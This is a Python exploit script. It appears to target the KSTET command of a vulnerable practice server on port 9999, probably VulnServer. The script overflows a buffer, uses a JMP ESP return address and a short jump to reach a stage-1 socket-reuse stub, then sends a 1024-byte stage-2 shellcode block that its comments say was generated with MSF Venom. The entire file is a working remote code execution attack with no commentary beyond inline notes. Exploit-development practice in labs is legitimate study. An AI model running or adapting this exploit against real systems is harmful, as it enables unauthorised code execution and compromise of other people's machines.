#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.
import time     # The module "time" provides access to the functions for getting the time, and sleeping.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# Stage 1 Shellcode.
STAGE1 = (
    b'\x83\xec\x64\x31\xff\x31\xdb\x53\x80\xc7\x04\x53' +
    b'\x89\xe3\x83\xc3\x64\x53\x47\x57\xb8\xa0\x23\xf1' +
    b'\x74\xff\xd0\x85\xc0\x75\xe6'
)

# Stage 2 Shellcode. Generated with MSF Venom!
SHELL =  b""
SHELL += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
SHELL += b"\x81\x76\x0e\x96\x17\xf9\x17\x83\xee\xfc\xe2\xf4"
SHELL += b"\x6a\xff\x7b\x17\x96\x17\x99\x9e\x73\x26\x39\x73"
SHELL += b"\x1d\x47\xc9\x9c\xc4\x1b\x72\x45\x82\x9c\x8b\x3f"
SHELL += b"\x99\xa0\xb3\x31\xa7\xe8\x55\x2b\xf7\x6b\xfb\x3b"
SHELL += b"\xb6\xd6\x36\x1a\x97\xd0\x1b\xe5\xc4\x40\x72\x45"
SHELL += b"\x86\x9c\xb3\x2b\x1d\x5b\xe8\x6f\x75\x5f\xf8\xc6"
SHELL += b"\xc7\x9c\xa0\x37\x97\xc4\x72\x5e\x8e\xf4\xc3\x5e"
SHELL += b"\x1d\x23\x72\x16\x40\x26\x06\xbb\x57\xd8\xf4\x16"
SHELL += b"\x51\x2f\x19\x62\x60\x14\x84\xef\xad\x6a\xdd\x62"
SHELL += b"\x72\x4f\x72\x4f\xb2\x16\x2a\x71\x1d\x1b\xb2\x9c"
SHELL += b"\xce\x0b\xf8\xc4\x1d\x13\x72\x16\x46\x9e\xbd\x33"
SHELL += b"\xb2\x4c\xa2\x76\xcf\x4d\xa8\xe8\x76\x48\xa6\x4d"
SHELL += b"\x1d\x05\x12\x9a\xcb\x7f\xca\x25\x96\x17\x91\x60"
SHELL += b"\xe5\x25\xa6\x43\xfe\x5b\x8e\x31\x91\xe8\x2c\xaf"
SHELL += b"\x06\x16\xf9\x17\xbf\xd3\xad\x47\xfe\x3e\x79\x7c"
SHELL += b"\x96\xe8\x2c\x47\xc6\x47\xa9\x57\xc6\x57\xa9\x7f"
SHELL += b"\x7c\x18\x26\xf7\x69\xc2\x6e\x7d\x93\x7f\xf3\x17"
SHELL += b"\x94\x18\x91\x15\x96\x08\x69\x9e\x70\x7d\xe9\x41"
SHELL += b"\xc1\x7f\x60\xb2\xe2\x76\x06\xc2\x13\xd7\x8d\x1b"
SHELL += b"\x69\x59\xf1\x62\x7a\x7f\x09\xa2\x34\x41\x06\xc2"
SHELL += b"\xfe\x74\x94\x73\x96\x9e\x1a\x40\xc1\x40\xc8\xe1"
SHELL += b"\xfc\x05\xa0\x41\x74\xea\x9f\xd0\xd2\x33\xc5\x16"
SHELL += b"\x97\x9a\xbd\x33\x86\xd1\xf9\x53\xc2\x47\xaf\x41"
SHELL += b"\xc0\x51\xaf\x59\xc0\x41\xaa\x41\xfe\x6e\x35\x28"
SHELL += b"\x10\xe8\x2c\x9e\x76\x59\xaf\x51\x69\x27\x91\x1f"
SHELL += b"\x11\x0a\x99\xe8\x43\xac\x19\x0a\xbc\x1d\x91\xb1"
SHELL += b"\x03\xaa\x64\xe8\x43\x2b\xff\x6b\x9c\x97\x02\xf7"
SHELL += b"\xe3\x12\x42\x50\x85\x65\x96\x7d\x96\x44\x06\xc2"

# Create STAGE2 with the shellcode and pad the rest of the
# 1024 buffer with NOPs
STAGE2 = SHELL + b'\x90' * (1024 - len(SHELL))

# Generate a payload the server expects: Command followed by Data
PAYLOAD = (
    b'KSTET ' +
    # NOP Padding
    b'\x90' * 8 +
    STAGE1 +
    b'A' * (66 - 8 - len(STAGE1)) +
    # 625014E6    FFE4                        JMP ESP
    struct.pack('<L', 0x625014E6) +
    # JMP SHORT 0xb5
    b'\xeb\xb8' +
    b'C' * (26 - 2)
)

with socket.create_connection((HOST, PORT)) as fd:
    print('Sending stage-1 payload...')
    fd.sendall(PAYLOAD)
    # This will trigger our stage-1 payload
    fd.recv(1024)
    print('Stage 1 sent!\nWaiting!')
    time.sleep(6)
    print('Sending stage-2 payload...')
    fd.sendall(STAGE2)
    print('Stage 2 sent!')